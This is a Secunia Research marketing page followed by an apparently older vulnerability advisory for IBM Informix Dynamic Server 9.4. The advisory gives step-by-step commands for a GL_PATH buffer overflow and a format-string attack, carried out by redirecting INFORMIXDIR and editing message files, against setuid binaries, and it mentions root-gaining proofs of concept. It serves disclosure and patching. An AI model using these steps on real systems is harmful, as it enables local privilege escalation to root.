How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Basic Explanation
************************************************************************
High Level Description  : IDS 9.4 contains multiple vulnerabilities

What to do              : Update to patch level IDS 9.40.UC3, 9.30.UC7
			  and 7.31.UD7 fix pack releases

Basic Technical Details
************************************************************************
Proof Of Concept Status : SNO has Proof of Concept.

Low Level Description   : Informix Dynamic Server 9.4 is a best-of-breed
online transaction processing database for enterprise and workgroup
computing. IDS is built on Dynamic Scalable Architecture that uses
hardware resources more efficiently and minimizes hardware requirements.

During routine product evalutation we noticed several setuid binaries
that contained security issues. Our Informix installation came with the
following setuid and setgid files:

-rwsr-sr--    1 root     informix 10153315 Jul 19 12:30 ./oninit
-rwsr-sr-x    1 root     informix  1019813 Jul 19 12:30 ./onmode

-rwxr-sr-x    1 informix informix   895424 Jul 19 12:29 ./onunload

Most if not all of the binaries share common exploitable conditions.
The first issue we noticed was a simple buffer overflow in the GL_PATH
environment variable.

[informix@vegeta bin]$ export GL_PATH=`perl -e 'print "A" x 998'`
[informix@vegeta bin]$ ./xtree
Segmentation fault

A quick run in gdb shows us the following. Smaller string lengths reveal
that this issue may be complicated because of a few free() calls.

[root@vegeta bin]# export GL_PATH=`perl -e 'print "A" x 3068'`ABCD

The next vulnerability we discovered is a bit more complex. When Informix
binaries are run they begin to look for several message files. It looks for
them in relation to the INFORMIXDIR environment variable.

If we set INFORMIXDIR to /tmp we can see it begins searching /tmp for the
necessary files.

[root@vegeta bin]# export INFORMIXDIR=/tmp
[root@vegeta bin]# strace ./onmonitor
execve("./onmonitor", ["./onmonitor"], [/* 34 vars */]) = 0
...
open("/tmp/en_us/0333.lco", O_RDONLY|O_LARGEFILE)
open("/tmp/etc/informix.rc", O_RDONLY|O_LARGEFILE)
open("/tmp/os/en_US.819", O_RDONLY|O_LARGEFILE)
open("/tmp/registry", O_RDONLY)

Depending on the application you are exploiting you will see that
several files are searched for.

Below we use /usr/informix/bin/oncheck as an example. We can see that it
searches for olutil.iem.

[root@vegeta informix]# bin/oncheck -cc aaa
shared memory not initialized for INFORMIXSERVER '<NULL>'

[root@vegeta bin]# strace bin/oncheck -cc aaa
...
strcat("/usr/informix/msg/en_us/0333"..., "olutil.iem")
access("/usr/informix/msg/en_us/0333"..., 4)
lseek64(3, 37251, 0, 0, 0)
read(3, "shared memory no"..., 55)
strcpy(0x081da720, "shared memory no"...)
printf("shared memory not initialized for INFORMIXSERV"...

Since we control the INFORMIXDIR it is fairly trivial for us to inject
format string messages into the printf() statements that are included
in order to throw various error messages.

Since INFORMIXDIR has a lot of critical items in it we must first make a
copy of it. The easiest way of doing this is via multiple symlinks.

[kf@vegeta kf]$ cd /tmp
[kf@vegeta tmp]$ for each in `find /usr/informix/ -type d`; do mkdir -p ./$each ; done
[kf@vegeta tmp]$ for each in `find /usr/informix`; do ln -s $each ./$each; done

Since we need to edit the message file we will need to rm the link and
copy the file into the correct location.

[kf@vegeta tmp]$ rm usr/informix/msg/en_us/0333/olutil.iem
[kf@vegeta tmp]$ cp /usr/informix/msg/en_us/0333/olutil.iem usr/informix/msg/en_us/0333/

Using the above oncheck example we will need to edit the olutil.iem.

Open up usr/informix/msg/en_us/0333/olutil.iem in vi and search for:
shared memory not initialized for INFORMIXSERVER '<NULL>'

As a test we can change the text to the following:
^@%x.%x. memory not initialized for INFORMIXSERVER '%s'

Running the binary again shows that we have hit paydirt.
[kf@vegeta tmp]$ bin/oncheck -cc aaa
81da718.bfffda08. memory not initialized for INFORMIXSERVER 'ï¿½jhCï¿½'

Obviously if we change the message to the following it becomes more
interesting:
%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n

[kf@vegeta tmp]$ bin/oncheck -cc aaa
Segmentation fault

Gdb shows us the obvious...

We currently have two different Proof of Concept exploits for the above
mentioned conditions. One takes gid informix and the other uid root.
